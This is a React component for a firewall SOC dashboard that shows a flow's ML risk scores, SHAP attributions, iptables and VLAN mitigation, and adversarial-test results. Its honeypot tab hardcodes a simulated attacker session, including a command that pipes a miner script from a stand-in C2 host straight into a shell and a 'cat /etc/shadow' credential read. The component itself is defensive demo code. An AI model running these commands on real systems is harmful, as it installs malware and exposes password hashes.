// src/components/FlowDetailPage.jsx
// Dedicated full detail inspection page for a selected network flow.
// Displays complete Ensemble SHAP attribution, Human-Friendly AI Threat Reasoning,
// Mitigation & Decoy shell logs, Telemetry matrix, and Adversarial test results.

import { useState } from 'react'
import RiskGauge from './RiskGauge'
import { riskClass, trustColor } from '../utils'

const FEATURE_CATEGORIES = {
  "Packet Lengths": [
    "Fwd Packet Length Max", "Fwd Packet Length Min", "Fwd Packet Length Mean", "Fwd Packet Length Std",
    "Bwd Packet Length Max", "Bwd Packet Length Min", "Bwd Packet Length Mean", "Bwd Packet Length Std",
    "Min Packet Length", "Max Packet Length", "Packet Length Mean", "Packet Length Std", "Packet Length Variance",
    "Average Packet Size"
  ],
  "Flow Dynamics & IAT": [
    "Flow Duration", "Flow Bytes/s", "Flow Packets/s", "Flow IAT Mean", "Flow IAT Std", "Flow IAT Max", "Flow IAT Min",
    "Fwd IAT Total", "Fwd IAT Mean", "Fwd IAT Std", "Fwd IAT Max", "Fwd IAT Min",
    "Bwd IAT Total", "Bwd IAT Mean", "Bwd IAT Std", "Bwd IAT Max", "Bwd IAT Min"
  ],
  "Protocol & TCP Flags": [
    "Destination Port", "Total Fwd Packets", "Total Length of Fwd Packets", "Fwd Header Length", "Bwd Header Length",
    "FIN Flag Count", "PSH Flag Count", "ACK Flag Count", "Init_Win_bytes_forward", "Init_Win_bytes_backward",
    "act_data_pkt_fwd", "min_seg_size_forward"
  ],
  "Active / Idle Times": [
    "Active Mean", "Active Max", "Active Min", "Idle Mean", "Idle Max", "Idle Min"
  ]
}

// Generates an intuitive, executive, plain-English diagnosis explaining why a flow was flagged or allowed
function getHumanFriendlyDiagnosis(flow) {
  if (!flow) return null
  const {
    action = 'Allow',
    fused_risk_score = 0,
    trust_score = 100,
    trust_band = 'High',
    shap_attribution,
    flow_id = '',
    source_ip = '192.168.1.100'
  } = flow

  const primary = shap_attribution?.primary_model || 'XGBoost Supervised Model'
  const topFeats = shap_attribution?.top_features || 'Flow IAT, Packet Lengths, TCP Flags'

  let threatCategory = 'Unknown Classification'
  let summary = ''
  let why = ''
  let actionTaken = ''
  let badgeClass = 'verdict-allow'

  const fid = flow_id.toUpperCase()

  if (fid.includes('PORT_SCAN') || (fid.includes('SCAN') && action !== 'Allow')) {
    threatCategory = 'Host Discovery & Port Reconnaissance'
    badgeClass = 'verdict-threat'
    summary = `A stealthy port scanning pattern was detected originating from host ${source_ip}. The client systematically probed multiple sequential destination ports to discover active listening services.`
    why = `The AI Ensemble flagged this flow because the packet inter-arrival time (Flow IAT) was unnaturally compressed and repeated SYN packet bursts with minimal payload sizes matched automated reconnaissance tools (such as Nmap / Masscan). TreeSHAP feature attribution identified destination port variance and packet timing compression as the primary statistical risk triggers.`
    actionTaken = action === 'Block'
      ? 'The firewall immediately issued an iptables kernel-level DROP rule to block further reconnaissance from this IP.'
      : 'The traffic was isolated and quarantined into a restricted VLAN to prevent network topology mapping.'
  } else if (fid.includes('DDOS') || fid.includes('DOS') || (fused_risk_score >= 85 && action === 'Block')) {
    threatCategory = 'Volumetric Flood Attack (DoS / DDoS)'
    badgeClass = 'verdict-threat'
    summary = `High-volume volumetric traffic spike detected. The host generated an abnormal flood of inbound packets designed to exhaust network bandwidth and connection states.`
    why = `Model A (XGBoost) identified a severe spike in packet transmission rate (Packets/sec) combined with abnormal forward/backward packet size asymmetry. TreeSHAP pinpointed Flow Duration and Total Fwd Packets as the primary statistical drivers exceeding safe baseline thresholds.`
    actionTaken = 'Kernel-level filtering was engaged to automatically drop all malicious packets before reaching backend infrastructure.'
  } else if (fid.includes('BRUTE') || fid.includes('AUTH') || (action === 'Quarantine')) {
    threatCategory = 'Credential Abuse / Brute-Force Activity'
    badgeClass = 'verdict-quarantine'
    summary = `Repeated unauthorized authentication or service brute-forcing behavior detected on sensitive management ports.`
    why = `Model B (Isolation Forest) flagged an anomaly in connection payload repetition and Model C detected mismatched JA3 TLS handshake signatures. The Zero-Trust engine also recorded missing MFA and unverified device credentials, lowering the trust score to ${trust_score.toFixed(0)}/100.`
    actionTaken = 'Rather than alerting the attacker by terminating the link, the firewall silently redirected the session to the Cowrie SSH Honeypot (Port 2222) on Quarantine VLAN 99, trapping the attacker while logging keystrokes and containment buffers.'
  } else if (action === 'Rate-limit' || (fused_risk_score >= 35 && fused_risk_score < 75)) {
    threatCategory = 'Suspicious / Elevated Traffic Anomaly'
    badgeClass = 'verdict-warning'
    summary = `Traffic parameters exceeded normal baseline expectations, but lack definitive signature confirmation of an active exploit.`
    why = `The combined meta-learner fused risk score (${fused_risk_score.toFixed(1)}/100) exceeded the baseline threshold. TreeSHAP showed moderate deviation in active/idle flow timing and TCP window parameters, while Zero-Trust health was rated ${trust_band}.`
    actionTaken = 'Bandwidth throttle (Rate-limiting) was automatically enforced to mitigate potential network degradation while keeping legitimate user access active.'
  } else {
    // Normal / Benign flow
    threatCategory = 'Legitimate & Verified Enterprise Traffic'
    badgeClass = 'verdict-clean'
    summary = `Normal network transaction with verified Zero-Trust credentials and healthy behavioral parameters.`
    why = `All three AI models (XGBoost, Isolation Forest, JA3 TLS Fingerprinting) reported negligible threat probability (Fused Risk: ${fused_risk_score.toFixed(1)}/100). The connection exhibits standard TCP handshake protocols, balanced forward/backward byte transfers, and verified Zero-Trust endpoint health.`
    actionTaken = 'Traffic was granted full uninterrupted passage (ALLOW) through stateful inspection with standard Quality of Service (QoS).'
  }

  return {
    threatCategory,
    summary,
    why,
    actionTaken,
    badgeClass,
    primary,
    topFeats
  }
}

export default function FlowDetailPage({ flow, vlanData, redTeamData, onBack }) {
  const [activeTab, setActiveTab] = useState('ensemble') // 'ensemble' | 'mitigation' | 'features' | 'adversarial'

  if (!flow) {
    return (
      <div className="detail-page-wrapper">
        <header className="detail-page-nav">
          <button className="back-btn" onClick={onBack}>
            ← Back to Live SOC Dashboard
          </button>
        </header>
        <div className="detail-empty">No flow data selected.</div>
      </div>
    )
  }

  const {
    flow_id,
    source_ip,
    action,
    reason,
    fused_risk_score,
    trust_score,
    trust_band,
    model_a_score,
    model_b_score,
    model_c_score,
    shap_attribution,
    _ts
  } = flow

  const contrib = shap_attribution?.contributions ?? {}
  const vlanEntry = vlanData ? Object.entries(vlanData).find(([k]) => k === flow_id) : null
  const vlanInfo = vlanEntry ? vlanEntry[1] : null

  // Check if this flow exists in adversarial tests
  const redTeamRow = redTeamData?.per_flow?.find(r => r.flow_id === flow_id)

  const actionColors = {
    Allow: 'var(--allow)',
    'Rate-limit': 'var(--ratelimit)',
    Quarantine: 'var(--quarantine)',
    Block: 'var(--block)',
  }

  const diagnosis = getHumanFriendlyDiagnosis(flow)

  return (
    <div className="detail-page-wrapper">
      
      {/* ── Top Navigation Bar ── */}
      <header className="detail-page-nav">
        <div className="nav-left">
          <button className="back-btn" onClick={onBack} title="Return to Live Dashboard">
            <span className="back-arrow">←</span> Back to Live SOC Dashboard
          </button>
          <div className="nav-divider" />
          <div className="breadcrumb">
            <span className="bc-root">TRUSTFLOW NGFW</span>
            <span className="bc-sep">/</span>
            <span className="bc-module">INSPECTION SUITE</span>
            <span className="bc-sep">/</span>
            <span className="bc-id">{flow_id}</span>
          </div>
        </div>
        <div className="nav-right">
          <span className="live-status-pill">
            <span className="live-dot" /> INSPECTION ACTIVE
          </span>
          <span className="meta-time">{_ts ?? new Date().toLocaleTimeString()}</span>
        </div>
      </header>

      {/* ── Scrollable Detail Body ── */}
      <div className="detail-page-content">

        {/* ── Seamless Hero Header Card (Zero Top Gap) ── */}
        <section className="detail-hero-card panel">
          <div className="hero-top-row">
            <div className="hero-identity">
              <div className="hero-badge-group">
                <span className="hero-id-label">FLOW IDENTITY</span>
                <span className={`diagnosis-pill ${diagnosis.badgeClass}`}>
                  {diagnosis.threatCategory}
                </span>
              </div>
              <h1 className="hero-flow-id">{flow_id}</h1>
              <div className="hero-meta-row">
                <span className="hero-meta-badge ip-badge">
                  <span className="meta-k">Source IP:</span> <strong className="meta-v">{source_ip ?? '192.168.1.100'}</strong>
                </span>
                <span className="hero-meta-badge">
                  <span className="meta-k">Evaluation:</span> <strong className="meta-v">{_ts ?? 'Just now'}</strong>
                </span>
                <span className="hero-meta-badge">
                  <span className="meta-k">Inspection:</span> <strong className="meta-v">AI Validated</strong>
                </span>
              </div>
            </div>

            <div className="hero-metrics">
              {/* Action State */}
              <div className="metric-box">
                <span className="metric-k">DECISION ACTION</span>
                <div className={`detail-action-badge ${action}`} style={{ color: actionColors[action] ?? 'var(--gold)' }}>
                  {action ?? 'Allow'}
                </div>
                <span className="metric-sub">{reason ?? 'Policy verified'}</span>
              </div>

              {/* Zero Trust Score */}
              <div className="metric-box">
                <span className="metric-k">ZERO TRUST SCORE</span>
                <div className="metric-hero-num" style={{ color: trustColor(trust_band) }}>
                  {trust_score?.toFixed(0) ?? '—'} <span className="metric-denom">/ 100</span>
                </div>
                <span className="metric-sub" style={{ color: trustColor(trust_band) }}>
                  {trust_band ?? 'Medium'} Trust Level
                </span>
              </div>

              {/* Fused Risk Score */}
              <div className="metric-box">
                <span className="metric-k">FUSED RISK INDEX</span>
                <div className={`metric-hero-num ${riskClass(fused_risk_score)}`}>
                  {fused_risk_score?.toFixed(1) ?? '—'} <span className="metric-denom">/ 100</span>
                </div>
                <span className="metric-sub">Multi-Model Ensemble</span>
              </div>
            </div>
          </div>

          {/* ── Human Understanding AI Diagnosis & Root Cause Card (Stacked Layout) ── */}
          <div className="hero-diagnosis-card">
            <div className="diag-header">
              <span className="diag-icon">💡</span>
              <span className="diag-title">Executive AI Threat Diagnosis & Root Cause Analysis</span>
            </div>
            
            <div className="diag-body-stacked">
              <div className="diag-stacked-item">
                <span className="diag-label">WHAT HAPPENED (SUMMARY):</span>
                <p className="diag-text">{diagnosis.summary}</p>
              </div>

              <div className="diag-stacked-item">
                <span className="diag-label">WHY THIS WAS FLAGGED (ROOT CAUSE):</span>
                <p className="diag-text">{diagnosis.why}</p>
              </div>

              <div className="diag-stacked-item">
                <span className="diag-label">DEFENSIVE MITIGATION ACTION TAKEN:</span>
                <p className="diag-text">{diagnosis.actionTaken}</p>
              </div>
            </div>
          </div>

        </section>

        {/* ── Sub-navigation Tabs ── */}
        <div className="detail-tabs">
          <button
            className={`detail-tab-btn ${activeTab === 'ensemble' ? 'active' : ''}`}
            onClick={() => setActiveTab('ensemble')}
          >
            🧠 Deep Ensemble & SHAP ({((fused_risk_score ?? 0)).toFixed(1)})
          </button>
          <button
            className={`detail-tab-btn ${activeTab === 'mitigation' ? 'active' : ''}`}
            onClick={() => setActiveTab('mitigation')}
          >
            ⚔️ Mitigation & Decoy Shell ({action})
          </button>
          <button
            className={`detail-tab-btn ${activeTab === 'features' ? 'active' : ''}`}
            onClick={() => setActiveTab('features')}
          >
            📊 52-Feature Telemetry Matrix
          </button>
          {redTeamRow && (
            <button
              className={`detail-tab-btn ${activeTab === 'adversarial' ? 'active' : ''}`}
              onClick={() => setActiveTab('adversarial')}
            >
              🎯 Adversarial Test Result
            </button>
          )}
        </div>

        {/* ── Tab 1: Deep Ensemble Breakdown & SHAP ── */}
        {activeTab === 'ensemble' && (
          <div className="tab-pane-grid">
            
            {/* Signature Gauge & Sub-models */}
            <div className="panel detail-subpanel">
              <div className="panel-header">
                <span className="panel-title">🧠 Fused Risk Calibration & Sub-Model Contributions</span>
              </div>
              <div className="panel-body subpanel-body">
                <div className="ensemble-showcase">
                  <div className="gauge-container">
                    <RiskGauge score={fused_risk_score ?? 0} size={175} />
                  </div>
                  
                  <div className="submodels-detail-list">
                    <div className="submodel-card">
                      <div className="sm-header">
                        <span className="sm-title">Model A — Supervised XGBoost</span>
                        <span className="sm-val">{(model_a_score ?? 0).toFixed(4)}</span>
                      </div>
                      <div className="sm-bar-track">
                        <div className="sm-bar-fill bar-a" style={{ width: `${Math.round((model_a_score ?? 0) * 100)}%` }} />
                      </div>
                      <span className="sm-desc">Detects known signature flow attacks via gradient-boosted trees.</span>
                    </div>

                    <div className="submodel-card">
                      <div className="sm-header">
                        <span className="sm-title">Model B — Unsupervised Isolation Forest</span>
                        <span className="sm-val">{(model_b_score ?? 0).toFixed(4)}</span>
                      </div>
                      <div className="sm-bar-track">
                        <div className="sm-bar-fill bar-b" style={{ width: `${Math.round((model_b_score ?? 0) * 100)}%` }} />
                      </div>
                      <span className="sm-desc">Flags statistical anomalies & zero-day zero-trust deviations.</span>
                    </div>

                    <div className="submodel-card">
                      <div className="sm-header">
                        <span className="sm-title">Model C — JA3 / TLS Fingerprint Anomaly</span>
                        <span className="sm-val">{(model_c_score ?? 0).toFixed(4)}</span>
                      </div>
                      <div className="sm-bar-track">
                        <div className="sm-bar-fill bar-c" style={{ width: `${Math.round((model_c_score ?? 0) * 100)}%` }} />
                      </div>
                      <span className="sm-desc">Analyzes cryptographic handshake patterns and client hello hashes.</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Complete SHAP Explainability & Meta-Learner Weights */}
            <div className="panel detail-subpanel">
              <div className="panel-header">
                <span className="panel-title">🔬 Meta-Learner Weights & SHAP Attribution</span>
                <span className="panel-badge">DRIVER: {shap_attribution?.primary_model ?? 'XGBoost'}</span>
              </div>
              <div className="panel-body subpanel-body">
                <div className="shap-detail-section">
                  
                  <div className="driver-highlight-card">
                    <span className="dh-label">PRIMARY ATTRIBUTION DRIVER:</span>
                    <h3 className="dh-title">{shap_attribution?.primary_model ?? 'Model A — XGBoost'}</h3>
                    <p className="dh-desc">{diagnosis.why}</p>
                  </div>

                  <div className="shap-meta-header">
                    <span>Meta-Learner Feature Attribution Weights</span>
                  </div>
                  
                  <div className="shap-contrib-table-wrap">
                    <table className="shap-contrib-table">
                      <thead>
                        <tr>
                          <th>Model / Signal Component</th>
                          <th>Weight Impact</th>
                          <th>Attribution Influence</th>
                        </tr>
                      </thead>
                      <tbody>
                        {Object.entries(contrib).map(([k, v]) => (
                          <tr key={k}>
                            <td className="shap-td-key">{k.replace(/_/g, ' ')}</td>
                            <td className="shap-td-bar">
                              <div className="shap-bar-bg">
                                <div
                                  className="shap-bar-inner"
                                  style={{
                                    width: `${Math.min(Math.abs(v) * 100, 100)}%`,
                                    background: v >= 0.4 ? 'var(--gold)' : 'var(--text-secondary)'
                                  }}
                                />
                              </div>
                            </td>
                            <td className="shap-td-val">{v.toFixed(4)}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>

                  {shap_attribution?.top_features && (
                    <div className="top-features-box">
                      <span className="tf-label">Top Local Flow Features:</span>
                      <span className="tf-val">{shap_attribution.top_features}</span>
                    </div>
                  )}

                </div>
              </div>
            </div>

          </div>
        )}

        {/* ── Tab 2: Mitigation Action & Honeypot Decoy Shell ── */}
        {activeTab === 'mitigation' && (
          <div className="tab-pane-single panel detail-subpanel">
            <div className="panel-header">
              <span className="panel-title">⚔️ Policy Enforcement & Decoy Containment History</span>
              <span className="panel-badge">{source_ip}</span>
            </div>
            <div className="panel-body subpanel-body">
              <div className="mitigation-full-layout">
                
                {/* Mitigation Policy Overview */}
                <div className="miti-overview-cards">
                  <div className="miti-card">
                    <span className="mc-icon">🔒</span>
                    <div className="mc-content">
                      <strong>Policy Decision:</strong>
                      <span style={{ color: actionColors[action] ?? 'var(--gold)', fontWeight: 800 }}> {action}</span>
                      <p>{reason ?? 'Automated risk-trust arbitration threshold applied.'}</p>
                    </div>
                  </div>

                  <div className="miti-card">
                    <span className="mc-icon">🔥</span>
                    <div className="mc-content">
                      <strong>iptables Kernel Rule:</strong>
                      <span> {action === 'Block' ? `iptables -A INPUT -s ${source_ip} -j DROP` : 'No blocking rule required'}</span>
                      <p>{action === 'Block' ? 'Active kernel level drop policy.' : 'Traffic allowed through stateful inspection.'}</p>
                    </div>
                  </div>

                  <div className="miti-card">
                    <span className="mc-icon">🌐</span>
                    <div className="mc-content">
                      <strong>VLAN Sandbox Assignment:</strong>
                      <span> {vlanInfo ? vlanInfo.vlan_status : (action === 'Quarantine' ? 'QUARANTINED_VLAN_99' : 'DEFAULT_VLAN_10')}</span>
                      <p>{vlanInfo?.simulated ? 'Dynamic container micro-segmentation active.' : 'Isolated subnet segmentation.'}</p>
                    </div>
                  </div>
                </div>

                {/* Full Honeypot Terminal */}
                {action === 'Quarantine' && (
                  <div className="honeypot-terminal-wrapper detail-terminal">
                    <div className="terminal-scanlines" aria-hidden="true" />
                    <div className="honeypot-header">
                      <div className="honey-dots">
                        <span className="hdot hdot-red"></span>
                        <span className="hdot hdot-yellow"></span>
                        <span className="hdot hdot-green"></span>
                      </div>
                      <div className="honey-title">
                        🍯 Decoy Honeypot Shell — Cowrie Sandbox Terminal ({source_ip}:2222)
                      </div>
                    </div>
                    <div className="honeypot-terminal-body">
                      <div className="honey-meta-bar">
                        <div><span className="honey-dim">Host:</span> cowrie-decoy-01:2222</div>
                        <div><span className="honey-dim">Attacker IP:</span> {source_ip}</div>
                        <div><span className="honey-dim">Isolation:</span> VLAN 99 (Trap Sandbox)</div>
                        <div><span className="honey-dim">Intent Profile:</span> <span style={{ color: 'var(--amber)' }}>Brute-force & Reconnaissance</span></div>
                      </div>
                      <div className="honey-auth-line">
                        <span className="honey-auth-badge">AUTH TRAP</span>
                        <span>SSH credentials captured: user=<code>root</code> pass=<code>admin123</code> &rarr; <strong style={{ color: 'var(--allow)' }}>SESSION GRANTED (DECOY VIRTUAL ENVIRONMENT)</strong></span>
                      </div>
                      <div className="honey-console-stream full-stream">
                        <div className="honey-cmd-block">
                          <div className="honey-cmd-line">
                            <span className="honey-prompt">root@decoy:~#</span>
                            <span className="honey-cmd-text">uname -a && id</span>
                          </div>
                          <div className="honey-output-text">Linux decoy-srv 5.15.0-89-generic #99-Ubuntu SMP x86_64 x86_64 GNU/Linux&#10;uid=0(root) gid=0(root) groups=0(root)</div>
                        </div>
                        <div className="honey-cmd-block">
                          <div className="honey-cmd-line">
                            <span className="honey-prompt">root@decoy:~#</span>
                            <span className="honey-cmd-text">wget http://evil-c2.net/miner.sh -O- | sh</span>
                          </div>
                          <div className="honey-output-text">--2026-08-24 14:17:05--  http://evil-c2.net/miner.sh&#10;Connecting to evil-c2.net:80... connected.&#10;HTTP request sent, awaiting response... 200 OK&#10;Length: 1420 (1.4K) [text/x-sh]&#10;[!] Dropper payload intercepted & sandboxed in memory buffer (1420 bytes).</div>
                        </div>
                        <div className="honey-cmd-block">
                          <div className="honey-cmd-line">
                            <span className="honey-prompt">root@decoy:~#</span>
                            <span className="honey-cmd-text">cat /etc/shadow</span>
                          </div>
                          <div className="honey-output-text">root:$6$fakehash$dummytoken:19000:0:99999:7:::&#10;daemon:*:19000:0:99999:7:::</div>
                        </div>
                        <div className="honey-cursor-line">
                          <span className="honey-prompt">root@decoy:~#</span>
                          <span className="honey-cursor">█</span>
                        </div>
                      </div>
                      <div className="honey-footer-stats">
                        <span>⌨️ <strong>48</strong> Keystrokes Logged</span>
                        <span>📦 <strong>1</strong> Dropper Contained in Quarantine Buffer</span>
                        <span className="honey-trapping-live">
                          <span className="trapping-dot" /> Session Live
                        </span>
                      </div>
                    </div>
                  </div>
                )}

              </div>
            </div>
          </div>
        )}

        {/* ── Tab 3: 52-Feature Telemetry Matrix ── */}
        {activeTab === 'features' && (
          <div className="tab-pane-single panel detail-subpanel">
            <div className="panel-header">
              <span className="panel-title">📊 Complete 52-Dimension Network Telemetry Matrix</span>
              <span className="panel-badge">{flow_id}</span>
            </div>
            <div className="panel-body subpanel-body">
              <div className="features-grid-categories">
                {Object.entries(FEATURE_CATEGORIES).map(([catTitle, cols]) => (
                  <div key={catTitle} className="feature-category-card">
                    <h4 className="fcat-title">{catTitle}</h4>
                    <div className="fcat-table-wrap">
                      <table className="fcat-table">
                        <tbody>
                          {cols.map((colName) => {
                            const val = flow[colName]
                            return (
                              <tr key={colName}>
                                <td className="fcol-name">{colName}</td>
                                <td className="fcol-val">
                                  {val !== undefined ? (typeof val === 'number' ? val.toLocaleString(undefined, { maximumFractionDigits: 3 }) : val) : '0'}
                                </td>
                              </tr>
                            )
                          })}
                        </tbody>
                      </table>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ── Tab 4: Adversarial Test Result ── */}
        {activeTab === 'adversarial' && redTeamRow && (
          <div className="tab-pane-single panel detail-subpanel">
            <div className="panel-header">
              <span className="panel-title">🎯 Adversarial Perturbation Outcome</span>
              <span className="panel-badge">{flow_id}</span>
            </div>
            <div className="panel-body subpanel-body">
              <div className="adv-detail-card">
                <div className="adv-comparison-row">
                  <div className="adv-box">
                    <span className="adv-k">Baseline Flow Action</span>
                    <strong className="adv-v">{redTeamRow.baseline_action ?? action}</strong>
                  </div>
                  <div className="adv-arrow">&rarr;</div>
                  <div className="adv-box">
                    <span className="adv-k">Perturbed Flow Action</span>
                    <strong className="adv-v">{redTeamRow.perturbed_action ?? '—'}</strong>
                  </div>
                  <div className="adv-box result-box">
                    <span className="adv-k">Robustness Result</span>
                    <strong className={redTeamRow.perturbed_action !== redTeamRow.baseline_action ? 'evaded' : 'detected'}>
                      {redTeamRow.perturbed_action !== redTeamRow.baseline_action ? '⚠ Perturbation Evaded' : '✓ Attack Still Detected'}
                    </strong>
                  </div>
                </div>
                <p className="adv-explanation">
                  This flow was perturbed with subtle feature noise (packet timing jitter and header modifications) to simulate adversarial evasion techniques. 
                  {redTeamRow.perturbed_action === redTeamRow.baseline_action 
                    ? ' The multi-model ensemble successfully maintained detection integrity.' 
                    : ' The perturbation altered the classification output.'}
                </p>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  )
}
